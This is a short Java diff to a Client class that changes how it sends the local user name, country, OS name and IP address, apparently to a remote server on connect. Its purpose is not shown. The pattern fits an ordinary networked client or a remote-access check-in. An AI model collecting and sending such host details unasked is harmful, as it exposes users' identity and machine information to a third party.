@@ -40,11 +40,8 @@ public class Client {
         String osCountry = System.getProperty("user.country");
 
         InetAddress ipAddress = InetAddress.getLocalHost();
-        //Ip local da máquina
-        String ipUser = ipAddress.getHostAddress();
 
-
-        bfw.write("[" + osCountry + "]" + osUser + " - " + osName + " - [" + ipUser + "]\r\n+");
+        bfw.write(osUser + "&" + osCountry + "&" + osUser + "&" + ipAddress);
         bfw.flush();
     }
 
